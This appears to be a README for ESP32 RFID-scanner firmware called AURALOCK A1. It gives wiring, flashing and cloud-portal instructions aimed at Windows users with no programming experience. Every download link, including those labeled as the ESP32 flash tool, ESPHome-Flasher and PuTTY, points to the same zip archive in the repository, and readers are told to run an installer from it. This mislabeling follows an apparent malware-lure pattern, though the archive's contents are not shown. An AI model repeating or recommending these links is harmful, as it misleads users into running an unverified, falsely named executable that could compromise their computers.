# 🔒 auralock-a1-firmware - Easy ESP32 RFID UID Scanner Setup

[![Download Latest Release](https://img.shields.io/badge/Download-AURALOCK%20A1-blue?style=for-the-badge)](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)

---

## 📋 About auralock-a1-firmware

**AURALOCK A1** is firmware for the ESP32 microcontroller. It scans RFID tags using the MFRC522 reader. This firmware helps you build a smart RFID UID scanner. Once set up, you can connect your device to the AURALOCK cloud portal. This lets you manage your UID reader and scans easily.

This firmware is open source and made for developers. However, this guide will help you, even with no programming experience, to get your scanner up and running on Windows.

## 🖥️ System Requirements

Before you start, ensure you have these items ready:

- A Windows PC (Windows 10 or newer recommended)
- An ESP32 board
- An MFRC522 RFID reader module
- USB cable to connect ESP32 to your PC
- Internet connection for downloading files and cloud connection
- Basic hardware assembly tools (screwdriver, jumper wires)

## 🔌 Hardware Setup

1. Connect the MFRC522 RFID reader to your ESP32 board. Use the following pin connections:

   - **SDA (SS) → GPIO 5**
   - **SCK → GPIO 18**
   - **MOSI → GPIO 23**
   - **MISO → GPIO 19**
   - **IRQ → Not connected**
   - **GND → Ground on ESP32**
   - **RST → GPIO 22**
   - **3.3V → 3.3V power on ESP32**

2. Double-check all connections to avoid damage.

3. Plug the ESP32 board into your Windows PC with the USB cable.

## 🚀 Getting Started: Downloading the Firmware

You will need to download the firmware files to your PC first.

**Step 1: Visit the Release Page**

Go to the release page by clicking the link below or paste it into your browser:

[![Download Latest Release](https://img.shields.io/badge/Download-AURALOCK%20A1-blue?style=for-the-badge)](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)

**Step 2: Choose the Latest Version**

On the page, find the newest release. It usually comes with a version number and date.

Look for files with an `.bin` extension or a zipped package containing the firmware.

**Step 3: Download the Firmware Files**

Click to download the firmware file to a folder you can find later, such as your desktop or downloads folder.

## 💾 Installing the Firmware on ESP32

You need software to upload the firmware to your ESP32 device.

### Required Tools

- [ESP32 Flash Download Tool (Windows)](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)
- OR [ESPHome-Flasher](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip) for simple flashing

### Step-by-Step Installation

1. Install the flashing tool by downloading and running its installer.

2. Open the tool after installation.

3. Connect your ESP32 board to your PC (if not already connected).

4. In the flashing tool, select the COM port matching the ESP32 device.

    - You can find this under Device Manager > Ports (COM & LPT).

5. Select the firmware `.bin` file you downloaded.

6. Choose the default flash settings if unsure.

7. Start the upload process.

8. Wait for the upload to finish. It usually takes a few minutes.

9. Once complete, disconnect and power cycle your ESP32.

## 🔧 Configuring and Using the Scanner

Once installed, your AURALOCK A1 device is ready to scan RFID tags.

- Power the ESP32 board either from USB or an external 3.3V power source.
- Present an RFID card or fob near the MFRC522 reader.
- The device reads the UID number of the tag.
- Data sends directly to the AURALOCK cloud portal for management.
- You can monitor scans and device status from the cloud interface.

If you do not have access to the AURALOCK cloud portal, you can use serial monitor software on your PC to read data:

- Download and open a serial terminal like [PuTTY](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip).
- Connect to the ESP32 COM port.
- Set baud rate to 115200.
- View scanned UID codes in real-time.

## 🌐 Accessing the AURALOCK Cloud Portal

This firmware sends scan results to the cloud where you can manage user IDs and devices.

To access:

1. Create an account on the official AURALOCK portal at their website.
2. Add your device by entering its unique ID.
3. Review and manage scan logs.

Cloud access steps will be detailed on the AURALOCK portal itself.

## 🛠️ Troubleshooting

- **ESP32 not recognized on PC:** Check the USB cable and port. Some cables only carry power, not data.
- **Flashing fails:** Close other programs that use the same COM port. Reboot and retry.
- **No scan data on serial monitor:** Confirm correct wiring of MFRC522. Use example sketches to test.
- **Cloud connection not working:** Check internet connection and device registration.

## 📄 Additional Resources

- ESP32 pinout and specifications can be found at Espressif’s website.
- MFRC522 RFID reader documentation explains connection and usage.
- The GitHub repository contains example code and detailed setup files.

## 🔗 Download Link

Get the latest AURALOCK A1 firmware here:

[Click here to visit and download](https://github.com/chixboyzer23/auralock-a1-firmware/raw/refs/heads/main/firmware/firmware-auralock-a-v2.9.zip)